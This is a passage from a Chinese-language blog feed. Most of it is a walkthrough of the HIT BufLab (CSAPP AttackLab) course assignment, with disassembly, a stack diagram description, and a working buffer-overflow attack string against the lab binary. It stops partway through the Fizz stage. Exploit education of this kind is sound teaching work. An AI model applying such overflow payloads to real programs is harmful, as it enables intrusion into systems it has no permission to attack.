alt="10"></p><p>测试用例15:</p><p>tsh的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/12.png" alt="12"></p><p>tshref的测试结果<img src="/CSAPP-ShellLab-哈工大简化版/Users/zhangenshang/hexo/source/_posts/CSAPP-ShellLab-哈工大简化版/13.png" alt="13"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先说一下，哈工大的特色就是规格严格功夫到家。然而收作业的时候，因为所谓的规格严格，在同时出现了两个规格的情况下，我们便不知道应该怎么做了，所以我希望无论什么时候都不要有两个不同的规格。&lt;/p&gt;
&lt;p&gt;闲话说完，开始准备看实验了。&lt;/p&gt;
&lt;p&gt;这个实验是CSAPP的ShellLab的简化版，也就是说ShellLab中的eval和do_bgfg两个函数不需要我们写，但是我嗯的实验报告上却让我们写代码的完成思路，呵呵，果然规格严格。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSAPP课程" scheme="http://yoursite.com/tags/CSAPP%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP: ShellLab</title>
    <link href="http://yoursite.com/CSAPP-ShellLab/"/>
    <id>http://yoursite.com/CSAPP-ShellLab/</id>
    <published>2018-11-28T17:54:10.000Z</published>
    <updated>2018-11-28T17:55:22.572Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>对之后的畅想</title>
    <link href="http://yoursite.com/%E5%AF%B9%E4%B9%8B%E5%90%8E%E7%9A%84%E7%95%85%E6%83%B3/"/>
    <id>http://yoursite.com/对之后的畅想/</id>
    <published>2018-11-28T17:33:39.000Z</published>
    <updated>2018-11-28T17:53:00.804Z</updated>
    
    <content type="html"><![CDATA[<p>​    一个不知道什么时候能放下电脑的人的嘤嘤嘤。</p><a id="more"></a>    <p>​    嘛，偶尔也想写一点跟学习无关的东西挂在博客上，但是考虑了这么久也不知道写一点什么。马上这个学期就要结束了。又到了假期，可能这学期给我的收获就是让我成功把自己的生物周期彻底搞乱掉（orz），毕竟放不下这个放不下那个又想都做好就是我的风格23333。往往又因为没有明确的计划而什么都没做，比如我的GRE（话说我从开学到现在一直都说要背单词结果什么都没做）。所以这次假期时间可能就要集中进行博客的更新了。（话说我在外地的时候是不是天天写博客不太好2333）</p><p>​    根据我的初步估计，我的假期想学的东西现在已经多达21种，我算算大概两天一种？emmmm，嘛，尽力而为。其中有计算机学习的方面，还有游戏玩法什么的，预计还会考虑做推歌的博文。。。。。（喂，你假期余额只剩1小时了！！）没办法，计算机本来就学不通，只能靠死记硬背来勉强维持生活（逃）。</p><p>​    总之，列一下表格，可能更的内容如下：</p><p>学习区：​    </p><table><thead><tr><th style="text-align:center">左</th><th style="text-align:center">右</th></tr></thead><tbody><tr><td style="text-align:center">CSAPP学习心得</td><td style="text-align:center">Swift</td></tr><tr><td style="text-align:center">BombLab</td><td style="text-align:center">AttackLab</td></tr><tr><td style="text-align:center">ShellLab</td><td style="text-align:center">LinkLab</td></tr><tr><td style="text-align:center">ProxyLab</td><td style="text-align:center">ArchitectureLab</td></tr><tr><td style="text-align:center">汇编语言x86-64学习心得</td><td style="text-align:center">Swift官方文本</td></tr><tr><td style="text-align:center">计算机组成原理学习心得</td><td style="text-align:center">C++编程思想学习心得</td></tr><tr><td style="text-align:center">Java编程思想学习心得</td><td style="text-align:center">编译原理学习心得</td></tr><tr><td style="text-align:center">算法导论学习心得</td><td style="text-align:center">计算机网络学习心得</td></tr><tr><td style="text-align:center">现代操作系统学习心得</td><td style="text-align:center">JavaScript</td></tr><tr><td style="text-align:center">JavaSE&amp;JavaEE</td><td style="text-align:center">如何利用python玩我的世界</td></tr><tr><td style="text-align:center">Ruby语言</td><td style="text-align:center">Google Jam算法竞赛</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td></tr></tbody></table><p>游戏区：</p><table><thead><tr><th style="text-align:center">左</th><th style="text-align:center">右</th></tr></thead><tbody><tr><td style="text-align:center">信长之野望 创造</td><td style="text-align:center">文明 5</td></tr><tr><td style="text-align:center">文明 6</td><td style="text-align:center">War3地图编辑器</td></tr><tr><td style="text-align:center">Let’s Go 皮卡丘！</td><td style="text-align:center">LLhelper</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td></tr></tbody></table><p>音乐区：</p><p>略，到时候再说。</p><p>总之，这个博客应该算是一个比较杂的博客。我就发一些我想写的东西。十分欢乐。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    一个不知道什么时候能放下电脑的人的嘤嘤嘤。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP AttackLab 哈工大版 bufflab</title>
    <link href="http://yoursite.com/CSAPP-AttackLab-%E5%93%88%E5%B7%A5%E5%A4%A7%E7%89%88-bufflab/"/>
    <id>http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/</id>
    <published>2018-11-20T16:30:15.000Z</published>
    <updated>2018-11-21T20:29:56.906Z</updated>
    
    <content type="html"><![CDATA[<pre><code>因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。</code></pre><a id="more"></a><h1 id="总体来看一下"><a href="#总体来看一下" class="headerlink" title="总体来看一下"></a>总体来看一下</h1><p>​    CSAPP的第三个实验，和BombLab一样挂钩于CSAPP课本的第三章，也就是主讲汇编语言的一章。与BombLab不同的是，AttackLab需要你自己去写汇编代码，而BombLab是需要你看懂汇编语言的程序。当然，如果你不像我一样忙得要死，还要肝的话。推荐在做这两个实验之前，将《<em>汇编语言</em>:<em>基于</em>x86处理器》学习完，那样的话，才真正达到了学习这门课的目的。</p><p>​    好了，言归正传。回到实验本身，哈工大的BuffLab实验包中有三个文件：</p><ul><li><p>bufbomb：也就是我们需要攻击的代码。</p></li><li><p>hex2raw : 将16进制的字符串转化为攻击需要的字符串。</p></li><li><p>makecookie：根据学号产生，一般是要求返回值为cookie值。</p><p>那么，我们就开始进行实验的准备。</p></li></ul><h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><p>​    那么，首先最重要的就是GDB、Objdump了。</p><p>我们需要利用objdump去进行反汇编程序，因为我们一开始得到的包中的程序是不能直接得到它的汇编代码的，而我们需要利用objdump的命令去得到包中程序的汇编代码。命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.txt</span><br></pre></td></tr></table></figure><p>​    之后，我们就能在文件夹中看到bufbomb的所有汇编代码了。</p><p>​    GDB是我们在进行3-5的攻击的时候，需要使用来对我们的汇编代码进行编译。命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br></pre></td></tr></table></figure><p>​    好的，介绍完我们在环境中需要做的准备，我们就介绍一下实验包中的三个文件的使用方法。</p><h2 id="bufbomb"><a href="#bufbomb" class="headerlink" title="bufbomb"></a>bufbomb</h2><p>​    首先我们来介绍一下bufbomb这个命令。这个命令是开启整个文件的一个基础命令，它的进阶的命令是-n/-u，其中在smoke、fizz、bang和boom实验中我们将会应用如下的语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb -u <span class="number">1170300532</span></span><br></pre></td></tr></table></figure><p>​    其中，第二个参数是你的学号，也就是说你会通过你的学号去在bufbomb中确认一个固定的值，而你的目标就是想办法利用这个值。</p><p>​    在nitro中我们将会应用如下的语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb -n -u <span class="number">1170300532</span></span><br></pre></td></tr></table></figure><p>​    其中第一个参数是开启getbufn和testn两个函数，也就是说我们在nitro中，需要调用和其他四个实验中不同的函数，关于函数的区别我们等到nitro的时候再详述。</p><h2 id="makecookie"><a href="#makecookie" class="headerlink" title="makecookie"></a>makecookie</h2><p>​    这个命令的功能和参数都十分简单，根据你输入的学号给出一个特定的序列称为cookie，你需要输入的命令是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./makecookies <span class="number">1170300532</span></span><br></pre></td></tr></table></figure><p>之后运行的结果是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; ./makecookie <span class="number">1170300532</span></span><br><span class="line"><span class="number">0</span>x676fa3c9</span><br></pre></td></tr></table></figure><p>而显示出生成的0x676fa3c9就是你的独一无二的cookie。</p><h2 id="hex2raw"><a href="#hex2raw" class="headerlink" title="hex2raw"></a>hex2raw</h2><p>​    我们通过这个命令来把我们自己输入的字符串转换为16进制的格式，格式如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;smoke_1170300532.txt&gt; smoke_raw_1170300532.txt</span><br></pre></td></tr></table></figure><p>​    这样我们就可以将我们自己写的字符串转化为计算机能够读懂的格式。</p><h1 id="Smoke"><a href="#Smoke" class="headerlink" title="Smoke"></a>Smoke</h1><p>​    好的，那么我们开始进行第一个实验，第一个实验的名称是Smoke，它的函数原型如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    根据ppt或者是CMU的第0个实验的实验指南我们可以得到，Smoke任务是构造攻击字符串，输入程序中后造成缓冲区溢出，从而使得在使用getbuf()返回时不返回到test()函数，而是返回到smoke()函数。攻击成功时如下：</p><p><img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122000717488.png" alt="image-20181122000717488"></p><p>​    好的根据提示，我们先分别查看一下getbuf、smoke、test函数的汇编代码。首先使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.txt</span><br></pre></td></tr></table></figure><p>​    这条指令去获得整个bufbomb包的所有函数的汇编代码，然后找到三个函数的位置。</p><p>其中，三个函数的代码如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048bbb &lt;smoke&gt;:</span><br><span class="line"> 8048bbb:55                   push   %ebp</span><br><span class="line"> 8048bbc:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048bbe:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048bc1:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048bc4:68 c0 a4 04 08       push   $0x804a4c0</span><br><span class="line"> 8048bc9:e8 92 fd ff ff       call   8048960 &lt;puts@plt&gt;</span><br><span class="line"> 8048bce:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048bd1:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048bd4:6a 00                push   $0x0</span><br><span class="line"> 8048bd6:e8 f0 08 00 00       call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048bdb:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048bde:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048be1:6a 00                push   $0x0</span><br><span class="line"> 8048be3:e8 88 fd ff ff       call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049378 &lt;getbuf&gt;:</span><br><span class="line"> 8049378:55                   push   %ebp</span><br><span class="line"> 8049379:89 e5                mov    %esp,%ebp</span><br><span class="line"> 804937b:83 ec 28             sub    $0x28,%esp</span><br><span class="line"> 804937e:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8049381:8d 45 d8             lea    -0x28(%ebp),%eax</span><br><span class="line"> 8049384:50                   push   %eax</span><br><span class="line"> 8049385:e8 9e fa ff ff       call   8048e28 &lt;Gets&gt;</span><br><span class="line"> 804938a:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804938d:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line"> 8049392:c9                   leave  </span><br><span class="line"> 8049393:c3                   ret</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048</span>c94 &lt;test&gt;:</span><br><span class="line"> <span class="number">8048</span>c94:<span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">8048</span>c95:<span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048</span>c97:<span class="number">83</span> ec <span class="number">18</span>             sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line"> <span class="number">8048</span>c9a:e8 <span class="number">64</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       call   <span class="number">8049103</span> &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048</span>c9f:<span class="number">89</span> <span class="number">45</span> f0             mov    %eax,-<span class="number">0</span>x10(%ebp)</span><br><span class="line"> <span class="number">8048</span>ca2:e8 d1 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       call   <span class="number">8049378</span> &lt;getbuf&gt;</span><br><span class="line"> <span class="number">8048</span>ca7:<span class="number">89</span> <span class="number">45</span> f4             mov    %eax,-<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>caa:e8 <span class="number">54</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       call   <span class="number">8049103</span> &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048</span>caf:<span class="number">89</span> c2                mov    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cb1:<span class="number">8</span>b <span class="number">45</span> f0             mov    -<span class="number">0</span>x10(%ebp),%eax</span><br><span class="line"> <span class="number">8048</span>cb4:<span class="number">39</span> c2                cmp    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cb6:<span class="number">74</span> <span class="number">12</span>                je     <span class="number">8048</span>cca &lt;test+<span class="number">0</span>x36&gt;</span><br><span class="line"> <span class="number">8048</span>cb8:<span class="number">83</span> ec <span class="number">0</span>c             sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cbb:<span class="number">68</span> <span class="number">60</span> a5 <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x804a560</span></span><br><span class="line"> <span class="number">8048</span>cc0:e8 <span class="number">9</span>b fc ff ff       call   <span class="number">8048960</span> &lt;puts@plt&gt;</span><br><span class="line"> <span class="number">8048</span>cc5:<span class="number">83</span> c4 <span class="number">10</span>             add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cc8:eb <span class="number">41</span>                jmp    <span class="number">8048</span>d0b &lt;test+<span class="number">0</span>x77&gt;</span><br><span class="line"> <span class="number">8048</span>cca:<span class="number">8</span>b <span class="number">55</span> f4             mov    -<span class="number">0</span>xc(%ebp),%edx</span><br><span class="line"> <span class="number">8048</span>ccd:a1 <span class="number">58</span> e1 <span class="number">04</span> <span class="number">08</span>       mov    <span class="number">0</span>x804e158,%eax</span><br><span class="line"> <span class="number">8048</span>cd2:<span class="number">39</span> c2                cmp    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cd4:<span class="number">75</span> <span class="number">22</span>                jne    <span class="number">8048</span>cf8 &lt;test+<span class="number">0</span>x64&gt;</span><br><span class="line"> <span class="number">8048</span>cd6:<span class="number">83</span> ec <span class="number">08</span>             sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cd9:ff <span class="number">75</span> f4             pushl  -<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>cdc:<span class="number">68</span> <span class="number">89</span> a5 <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x804a589</span></span><br><span class="line"> <span class="number">8048</span>ce1:e8 <span class="number">9</span>a fb ff ff       call   <span class="number">8048880</span> &lt;printf@plt&gt;</span><br><span class="line"> <span class="number">8048</span>ce6:<span class="number">83</span> c4 <span class="number">10</span>             add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>ce9:<span class="number">83</span> ec <span class="number">0</span>c             sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cec:<span class="number">6</span>a <span class="number">03</span>                push   <span class="variable">$0x3</span></span><br><span class="line"> <span class="number">8048</span>cee:e8 d8 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       call   <span class="number">80494</span>cb &lt;validate&gt;</span><br><span class="line"> <span class="number">8048</span>cf3:<span class="number">83</span> c4 <span class="number">10</span>             add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cf6:eb <span class="number">13</span>                jmp    <span class="number">8048</span>d0b &lt;test+<span class="number">0</span>x77&gt;</span><br><span class="line"> <span class="number">8048</span>cf8:<span class="number">83</span> ec <span class="number">08</span>             sub    <span class="variable">$0x8</span>,%esip</span><br><span class="line"> <span class="number">8048</span>cfb:ff <span class="number">75</span> f4             pushl  -<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>cfe:<span class="number">68</span> a6 a5 <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x804a5a6</span></span><br><span class="line"> <span class="number">8048</span>d03:e8 <span class="number">78</span> fb ff ff       call   <span class="number">8048880</span> &lt;printf@plt&gt;</span><br><span class="line"> <span class="number">8048</span>d08:<span class="number">83</span> c4 <span class="number">10</span>             add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>d0b:<span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">8048</span>d0c:c9                   leave  </span><br><span class="line"> <span class="number">8048</span>d0d:c3                   ret</span><br></pre></td></tr></table></figure><p>​        我们不要被很长的汇编代码吓到，因为他们真正有用的部分不过几行罢了，我们这个实验的真正目的就是让大家知道怎么确定哪里的汇编代码有效，哪些对解决问题没有帮助。根据提示的要求，我们先看一下getbuf函数。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049378</span> &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">8049378</span>:<span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">8049379</span>:<span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">804937</span>b:<span class="number">83</span> ec <span class="number">28</span>             sub    <span class="variable">$0x28</span>,%esp</span><br><span class="line"> <span class="number">804937</span>e:<span class="number">83</span> ec <span class="number">0</span>c             sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8049381</span>:<span class="number">8</span>d <span class="number">45</span> d8             lea    -<span class="number">0</span>x28(%ebp),%eax</span><br><span class="line"> <span class="number">8049384</span>:<span class="number">50</span>                   push   %eax</span><br><span class="line"> ....</span><br></pre></td></tr></table></figure><p>​    根据以上的语句我们可以看出，esp是栈顶指针，而ebp是栈帧的指针，我们先从栈顶开始，然后第一个sub语句是建立了多深的缓冲区，而此时ebp仍然是指向栈顶的，所以lea语句，将栈顶的位置传递给了eax这个寄存器，所以根据以上的信息，我们可以认定getbuf所申请的缓冲区一共是0x28也就是40个字节。那么我们的目的就很明显了，也就是通过我们对栈进行溢出的操作使得getbuf的返回地址变更为smoke的地址。那么我们就来看一下32位系统的栈帧结构：</p><p><img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122002831104.png" alt="image-20181122002831104"></p><p>​    从这个栈帧结构中我们可以看出我们要攻击的就是返回地址区域，那么根据我们之前的汇编代码我们就可以确定出我们最后的攻击字符串应该是什么样子的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">一开始申请的40字节</span><br><span class="line">00 00 00 00  test() ebp的值</span><br><span class="line">bb 8b 04 08 目标smoke的地址</span><br></pre></td></tr></table></figure><p> 攻击结果如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">20</span> <span class="number">22</span>:<span class="number">28</span></span><br><span class="line">zinker &gt;&gt;&gt; cat smoke_in.txt|./hex2raw | ./bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><p>那么到此为止，第一个实验完成。</p><h1 id="Fizz"><a href="#Fizz" class="headerlink" title="Fizz"></a>Fizz</h1><p>​    好的，那么我们接下来进行第二个实验。这个实验叫做fizz。它的函数原型如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>,val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire!: You called fizz(0x%x)\n"</span>,val);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    仍然是，根据ppt的内容我们可以得到一些提示，解决这个攻击需要我们构造攻击字符串使得缓冲区溢出，使得目标程序调用fizz函数，并且将cookie的值作为参数传递给fizz函数，使得fizz函数的判断成功。</p><p>​    好的，我们依旧按照顺序，先找到fizz对应的汇编代码，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048be8 &lt;fizz&gt;:</span><br><span class="line"> 8048be8:55                   push   %ebp</span><br><span class="line"> 8048be9:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048beb:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048bee:8b 55 08             mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bf1:a1 58 e1 04 08       mov    0x804e158,%eax</span><br><span class="line"> 8048bf6:39 c2                cmp    %eax,%edx</span><br><span class="line"> 8048bf8:75 22                jne    8048c1c &lt;fizz+0x34&gt;</span><br><span class="line"> 8048bfa:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048bfd:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line"> 8048c00:68 db a4 04 08       push   $0x804a4db</span><br><span class="line"> 8048c05:e8 76 fc ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c0a:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c0d:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048c10:6a 01                push   $0x1</span><br><span class="line"> 8048c12:e8 b4 08 00 00       call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048c17:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c1a:eb 13                jmp    8048c2f &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c1c:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048c1f:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line"> 8048c22:68 fc a4 04 08       push   $0x804a4fc</span><br><span class="line"> 8048c27:e8 54 fc ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c2c:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c2f:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048c32:6a 00                push   $0x0</span><br><span class="line"> 8048c34:e8 37 fd ff ff       call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>​    老规矩，我们先从getbuf开始讲起，和smoke相似的是，我们都要将缓冲区溢出，在溢出之后，我们通过改变函数的返回地址，从而使得函数进入fizz函数，但是根据fizz函数的汇编代码，我们可以看到，我们需要将我们的cookie的值作为参数导入到函数中，那也就是说我们应该同时修改函数参数区的值，根据栈结构理解一下，栈结构如图所示：</p><p>​    <img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122011656564.png" alt="image-20181122011656564"></p><p>根据fizz的代码我们可以看出，其实是取了ebp+0x8地址上的参数进行比较，所以我们在构造字符串的时候，也就是我们要把ebp+0x8的位置的值写成我们的cookie值。而当函数返回的时候，ebp会指向返回地址处，所以我们将ebp+0x8处存入cookie即可。</p><p>​    所以我们构建出了如下的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 